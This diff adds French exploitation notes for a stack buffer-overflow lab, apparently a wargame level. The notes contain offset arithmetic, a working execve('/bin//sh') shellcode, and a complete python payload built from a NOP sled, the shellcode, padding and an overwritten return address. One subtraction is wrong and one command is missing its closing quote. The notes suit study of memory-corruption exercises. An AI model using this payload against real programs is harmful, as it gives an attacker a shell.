@@ -1,0 +1,31 @@
+Stack : 
+    96 - 64 = 28
+
+    buffer = 64
+    i = 4
+    push ebp = 4
+    push edi = 4
+    push ebx = 4
+
+    80
+
+adresse sans gdb : 0x7fffffffe61c
+
+adresse dans gdb : 0x7fffffffe5fc
+
+adresse du buffer : 0xffffd6bc 
+
+1564 - 1532 = 32
+
+ce qui donne : 0xffffd6bc + 0x20 = 0xffffd6dc
+
+taille du shellcode = 28 octets; 
+// \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+
+nombres de nopes =  64 - 28 = 36 
+
+36 / 2 = 0x12
+
+0xffffd6dc + 0x12 = 0xffffd6ef
+python -c "print('dat_wil')"; python -c "print('\x90' * 36 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A' * 16 + '\xef\xd6\xff\xff')
+
